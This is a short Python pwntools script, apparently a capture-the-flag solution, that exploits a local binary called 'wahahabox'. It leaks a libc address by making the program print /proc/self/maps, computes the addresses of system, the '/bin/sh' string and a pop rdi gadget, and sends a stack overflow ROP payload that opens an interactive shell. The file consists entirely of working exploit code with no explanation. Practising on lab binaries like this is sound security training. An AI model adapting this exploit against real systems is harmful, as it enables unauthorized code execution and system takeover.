from pwn import *
#context(arch = 'amd64', os = 'linux', log_level = 'debug')
context(arch = 'amd64', os = 'linux')
r=process("./wahahabox")
#elf = ELF('./wahahabox')

r.recvuntil("Wahaha?")
r.sendline("/proc/self/maps")

r.recvuntil("[heap]\n")
r.recvuntil("\n")
libc_addr=int(r.recv(12)[-12:].rjust(16,b'0'),16)
print("libc_addr:",hex(libc_addr))

libcbase=libc_addr
system=libcbase+0x528f0+27
bin_sh=libcbase+0x1a7e43
pop_rdi=libcbase+0x2a205
payload=b'a'*0x28+p64(pop_rdi)+p64(bin_sh)+p64(system)
print("libc_addr",hex(libc_addr))
r.send(payload)

r.interactive()